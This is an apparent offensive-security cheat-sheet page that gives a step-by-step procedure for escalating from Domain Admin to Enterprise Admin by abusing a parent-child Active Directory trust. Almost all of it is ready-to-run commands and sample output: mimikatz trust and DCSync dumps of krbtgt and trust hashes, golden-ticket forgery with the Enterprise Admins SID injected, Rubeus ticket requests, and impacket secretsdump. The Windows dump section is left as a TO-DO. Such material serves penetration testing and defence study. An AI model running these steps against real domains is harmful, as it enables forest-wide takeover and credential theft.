---
title: "Abuse Parent-Child Domain Trusts"
date: 2025-7-24
tags: ["Active Directory",  "Privilege Escalation",  "Domain Trusts",  "Parent-Child Trust",  "Kerberos",  "Golden Ticket",  "Mimikatz",  "Rubeus",  "Pass-The-Ticket",  "Ticket Granting Ticket",  "Credential Dumping",  "Cross-Domain Attack",  "Windows"]
---

### Privesc from DA (Domain Admin) to EA (Enterprise Admin)

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check Trust Relationships

```console
# Get all trusted domain objects in a forest
Get-ADTrust -Filter *
```

```console {class="sample-code"}
PS C:\Windows\system32> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=example.com,CN=System,DC=corp,DC=example,DC=com
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : example.com
ObjectClass             : trustedDomain
ObjectGUID              : b0c64079-6f51-4516-9a62-90f94666bfc1
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=corp,DC=example,DC=com
Target                  : example.com
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           : 
TrustingPolicy          : 
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

```console
# Returns a list of trusted domains
nltest /domain_trusts
```

```console {class="sample-code"}
PS C:\Windows\system32> nltest /domain_trusts

List of domain trusts:
    0: EXAMPLE example.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: EXAMPLE-CORP corp.example.com (NT 5) (Forest: 0) (Primary Domain) (Native)
The command completed successfully
```

```console
# Gets a collection of the trust relationships of the current forest
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

```console {class="sample-code"}
PS C:\Windows\system32> ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

SourceName     TargetName   TrustType TrustDirection
----------     ----------   --------- --------------
corp.example.com example.com  ParentChild  Bidirectional
```

```console
# Check forest trust
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

#### 2. Get Current and Target Domain SID

```console
.\mimikatz.exe "lsadump::trust" "exit"
```

```console {class="sample-code"}
PS C:\Windows\system32> .\mimikatz.exe 'lsadump::trust' 'exit'

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::trust

Current domain: CORP.EXAMPLE.COM (EXAMPLE-CORP / S-1-5-21-2034262909-2733679486-179904498)

Domain: EXAMPLE.COM (EXAMPLE / S-1-5-21-4084500788-938703357-3654145966)
ERROR kuhl_m_lsadump_trust ; LsaQueryTrustedDomainInfoByName c0000003

mimikatz(commandline) # exit
Bye!
```

#### 3. Get krbtgt Hash

```console
.\mimikatz.exe "lsadump::dcsync /all /csv" "exit"
```

```console {class="sample-code"}
PS C:\Windows\system32> .\mimikatz "lsadump::dcsync /all /csv" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /all /csv
[DC] 'corp.example.com' will be the domain
[DC] 'PRIMARY.corp.example.com' will be the DC server
[DC] Exporting domain 'corp.example.com'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  7ddf32e17a6ac5ce04a8ecbf782ca509        514
500     Administrator   ac2b5f88fc33b7b9e0682be85784ec0d        512
1000    PRIMARY$        59920e994636168744039017dcf49e54        532480
1103    EXAMPLE$  f4de7fcd07c14a00ff96c5f900625529        2080

mimikatz(commandline) # exit
Bye!
```

#### 4. Forge a Golden Ticket

```console
# Append '-519' to target domain SID (Enterprise Admins Group)
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /rc4:<PARENT_HASH> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi" "exit"
```

```console {class="sample-code"}
PS C:\Windows\system32> .\mimikatz "kerberos::golden /user:Administrator /rc4:f4de7fcd07c14a00ff96c5f900625529 /domain:CORP.EXAMPLE.COM /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ticket:C:\ProgramData\ticket.kirbi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /rc4:f4de7fcd07c14a00ff96c5f900625529 /domain:CORP.EXAMPLE.COM /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /ticket:C:\ProgramData\ticket.kirbi
User      : Administrator
Domain    : CORP.EXAMPLE.COM (CORP)
SID       : S-1-5-21-2034262909-2733679486-179904498
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-4084500788-938703357-3654145966-519 ; 
ServiceKey: 69eb46aa347a8c68edb99be2725403ab - rc4_hmac_nt      
Lifetime  : 9/25/2024 12:57:24 AM ; 9/23/2034 12:57:24 AM ; 9/23/2034 12:57:24 AM
-> Ticket : C:\ProgramData\ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!
```

<small>*Note: Try different high value hashes if failed*</small>

#### 5. Request a Service Ticket of Target Domain

```console
.\rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
```

```console {class="sample-code"}
PS C:\programdata> .\rubeus.exe asktgs /service:cifs/dc01.example.com /domain:EXAMPLE.COM /dc:dc01.example.com /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/dc01.example.com'
[*] Using domain controller: dc01.example.com (10.0.0.254)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      doIFAjCCBP ---[SNIP]--- 9zdC5odGI=

  ServiceName              :  cifs/dc01.example.com
  ServiceRealm             :  EXAMPLE.COM
  UserName                 :  Administrator
  UserRealm                :  CORP.EXAMPLE.COM
  StartTime                :  9/25/2024 1:15:43 AM
  EndTime                  :  9/25/2024 11:15:43 AM
  RenewTill                :  10/2/2024 1:15:43 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  +70Y7u2/llZ0AchmQrfS1eCfIhqN+g009OH5odxLG/A=


[*] Ticket written to C:\ProgramData\ticket_2.kirbi
```

{{< /tabcontent >}}

#### 6. Secrets Dump

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Convert kirbi to ccache

```console
python3 rubeustoccache.py '<BASE64_TICKET>' administrator.kirbi administrator.ccache
```

```console {class="sample-code"}
$ python3 rubeustoccache.py 'doIFAjCCBP ---[SNIP]--- 9zdC5odGI=' administrator.kirbi administrator.ccache

╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
              By Solomon Sklash
          github.com/SolomonSklash
   Inspired by Zer1t0's ticket_converter.py

[*] Writing decoded .kirbi file to administrator.kirbi
[*] Writing converted .ccache file to administrator.ccache
[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=administrator.ccache
```

#### 2. Secrets Dump

```console
export KRB5CCNAME=administrator.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=administrator.ccache
```

```console
sudo ntpdate -s <DC_IP> && impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.example.com && impacket-secretsdump administrator@dc01.example.com -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Target system bootKey: 0x994f007efc09c1eef3cb77537daf4a27
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:59920e994636168744039017dcf49e54:::
---[SNIP]---
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. TO-DO

```console
TO-DO
```

{{< /tabcontent >}}
